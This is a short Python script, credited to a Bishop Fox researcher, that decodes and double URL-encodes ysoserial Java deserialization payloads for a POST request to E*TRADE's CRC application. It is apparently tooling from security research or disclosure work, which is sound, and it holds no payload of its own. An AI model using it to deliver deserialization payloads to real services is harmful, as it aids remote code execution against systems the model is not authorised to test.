## generate_crc_payload.py 
## by Timothy Sapio 
## Bishop Fox 
## This script is for properly URL encoding the raw Java serialized 
## objects generated by ysoserial to be included in a POST request to 
## ETRADE's CRC application. 
## Usage: python generate_crc_payload.py <ysoserial_payload_filename> 
import os 
import urllib
from sys import argv

def generate_raw_payload(url_payload_file):
    with open(url_payload_file, "rb") as f:
        url_payload = f.read()
    raw_payload = urllib.unquote(url_payload)
    raw_payload_filename = url_payload_file + ".raw" 
        
    with open(url_payload_file + ".raw", "w+") as f:
        f.write(raw_payload) 
        f.close() 
    return raw_payload_filename 
            
def generate_crc_payload(raw_payload_file):
    with open(raw_payload_file, "rb") as f:
        raw_payload = f.read() 
    url_payload = urllib.quote_plus(raw_payload,safe='+')
    double_url_payload = urllib.quote_plus(url_payload)
    print("CRC Payload: \n")
    print(double_url_payload)
        
if len(argv) < 2:
    print("Usage: python url_encoding_check.py <filename>")
    
    
else: 
    filename = argv[1]
    print("Generating raw payload...")
    raw_filename = generate_raw_payload(filename)
    print("Generating CRC payload...")
    generate_crc_payload(raw_filename)
